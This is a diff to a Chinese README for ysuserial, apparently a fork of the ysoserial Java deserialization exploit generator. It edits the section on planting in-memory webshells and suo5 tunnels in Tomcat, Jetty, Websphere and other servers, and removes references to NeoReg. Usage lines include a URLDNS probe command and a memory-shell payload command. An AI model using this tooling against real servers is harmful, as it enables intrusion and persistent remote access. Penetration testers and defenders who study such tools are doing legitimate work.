@@ -146,7 +146,7 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 
 ### 扩展攻击-内存马及回显
 
-如果使用这些利用链进行攻击，本项目内置了一些高级扩展用法，命令均使用 `EX-` 开头，包括内存马、 NeoReg 流量隧道、命令执行回显等，具体如下：
+如果使用这些利用链进行攻击，本项目内置了一些高级扩展用法，命令均使用 `EX-` 开头，包括内存马、命令执行回显等，具体如下：
 
 命令执行回显：
 
@@ -180,13 +180,7 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - 命令 `EX-MS-WSFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Websphere Filter 型内存马
 - 命令 `EX-MS-RMIBindTemplate-...`：RMI 型内存马
 
-目前支持的直打内存马的类型包括 Tomcat、Jetty、JBoss/Wildfly、Websphere、Resin、Spring，还有以下几个暂未支持：
-
-- GlassFish 内嵌了 Tomcat，实现类似，稍微改改即可；
-- Apusic ≈ GlassFish，改包名；
-- BES ≈ Tomcat，改包名；
-- InforSuite ≈ Tomcat，改包名；
-- Weblogic 还未实现，后续版本随着 Weblogic 的反序列化 payload 一起添加。
+目前支持的直打内存马的类型包括 Tomcat、Jetty、JBoss/Wildfly、Websphere、Resin、Spring。
 
 并可以通过关键字指定内存马的类型，如冰蝎内存马、哥斯拉 Base64 内存马、哥斯拉 RAW 内存马、CMD 命令回显马等，使用方法例子如下：
 
@@ -406,7 +400,7 @@ java -jar ysuserial-<version>-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
 
    ![image-20220618232717600](images/image-20220618232717600.png)
 
-4. 如果是 <font color="orange"> suo5 </font> 内存马，则会直接创建一个 suo5 隧道，可以直接由 suo5 客户端进行连接，由于 suo5 目前对 UA 进行了鉴权，因此生成时需要指定参数 `-hk "User-Agent" -hv "aaaawww"`，如下可正常连接：
+4. 如果是 <font color="orange"> suo5 </font> 内存马，则会直接创建一个 suo5 隧道，可以直接由 suo5 客户端进行连接，suo5 目前对支持了对自定义 Header 头部进行鉴权，生成时可以通过参数 `-hk "User-Agent" -hv "aaaawww"` 指定，如下可正常连接：
 
    ![image-20230228155643777](images/image-20230228155643777.png)
 
@@ -488,7 +482,6 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSF
 - [https://github.com/woodpecker-framework/ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)
 - [https://github.com/Y4er/ysoserial](https://github.com/Y4er/ysoserial)
 - [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
-- [https://github.com/L-codes/Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)
 - [https://github.com/kezibei/Urldns/](https://github.com/kezibei/Urldns/)
 
 有兴趣的伙伴可以自行查看。
